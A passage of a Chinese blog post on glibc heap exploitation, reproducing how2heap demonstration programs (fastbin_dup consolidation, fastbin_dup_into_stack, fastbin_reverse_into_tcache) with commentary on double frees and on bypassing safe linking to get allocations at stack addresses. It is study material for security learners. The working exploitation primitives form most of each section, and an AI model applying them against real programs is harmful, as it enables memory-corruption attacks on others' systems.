class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add this chunk to the fastbin list...\n\n&quot;</span>);</span><br><span class="line">  	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  	<span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	assert(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个主要是利用了<code>malloc_consolidate</code>把fastbin与top chunk进行合并的一个过程。首先还是常规的塞满tcache bin</p>
<p>然后申请一个chunk (p1)，再free掉，这个chunk会被放进fastbin</p>
<p>然后申请一个0x400大小的chunk，它属于large bin范围，会进入<code>__int_malloc</code>的这个分支，调用<code>malloc_consolidate</code>进行fastbin整理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    	malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就把原先处于fastbin的p1合并进了top chunk，然后又在top chunk被分配出来，变成了p3。</p>
<p>此时我们如果有个double free的利用，free掉 p1，再申请一个0x400大小的p4,就能获取两个指向同一个chunk的指针(p3和p4)，可以进行泄露地址与利用</p>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking calloc into\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> *ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">2</span>] __attribute__ ((aligned (<span class="number">0x10</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want calloc() to return is %p.\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>); <span class="comment">//First call to free will add a reference to the fastbin</span></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Calling free(a) twice renders the program vulnerable to Double Free</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line">		<span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *d = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st calloc(1,8): %p\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd calloc(1,8): %p\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line">		<span class="string">&quot;so that calloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line">		<span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">	stack_var[<span class="number">1</span>] = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n&quot;</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ptr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) d;</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">	*d = (addr &gt;&gt; <span class="number">12</span>) ^ ptr;</span><br><span class="line">	<span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd calloc(1,8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> *p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th calloc(1,8): %p\n&quot;</span>, p);</span><br><span class="line">	assert((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p == (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var + <span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个和刚刚的fastbin_dup差不多，就是提到的两个利用之一：修改链表指向导致任意地址申请，只不过这里比较特殊，是栈地址</p>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;An heap address leak is needed to perform this attack.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The same patch also ensures the chunk returned by tcache is properly aligned.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">	<span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">		ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">	  	   <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Fill the tcache.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>, victim);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;a single free is sufficient.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Fill the fastbin.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">	<span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">	<span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>, &amp;stack_var[<span class="number">2</span>], (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">			<span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>, victim);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">	<span class="comment">// The following operation assumes the address of victim is known, thus requiring</span></span><br><span class="line">	<span class="comment">// a heap leak.</span></span><br><span class="line">	*(<span class="keyword">size_t</span>**)victim = (<span class="keyword">size_t</span>*)((<span class="keyword">long</span>)&amp;stack_var[<span class="number">0</span>] ^ ((<span class="keyword">long</span>)victim &gt;&gt; <span class="number">12</span>));</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//------------------------------------</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Empty tcache.</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">			<span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;\n&quot;</span></span><br><span class="line">		   <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span></span><br><span class="line">			<span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>, q);</span><br><span class="line">	</span><br><span class="line">	assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Photon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/">http://phot0n.com/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/heap/">heap</a><a class="post-meta__tags" href="/tags/IO-FILE/">IO_FILE</a><a class="post-meta__tags" href="/tags/libc/">libc</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/08/QEMU-RUN/"><img class="prev-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">QEMU逃逸入门</div></div></a></div><div class="next-post pull-right"><a href="/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"><img class="next-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">firmAE框架分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/" title="高版本的堆利用与FSOP"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-06</div><div class="title">高版本的堆利用与FSOP</div></div></a></div><div><a href="/2022/11/14/fastbin-reverse-into-tcache/" title="fastbin reverse into tcache"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">fastbin reverse into tcache</div></div></a></div><div><a href="/2022/07/04/%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC%E4%BB%A5%E5%8F%8Aunlink-ZJCTF-easyheap/" title="指定libc版本以及unlink[ZJCTF-easyheap]"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-04</div><div class="title">指定libc版本以及unlink[ZJCTF-easyheap]</div></div></a></div><div><a href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-19</div><div class="title">CVE-2016-9793分析</div></div></a></div><div><a href="/2023/04/08/QEMU-RUN/" title="QEMU逃逸入门"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-08</div><div class="title">QEMU逃逸入门</div></div></a></div><div><a href="/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/" title="内核堆利用相关"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-19</div><div class="title">内核堆利用相关</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Photon</div><div class="author-info__description">光子</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">53</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/photonwork"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/photonwork" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas 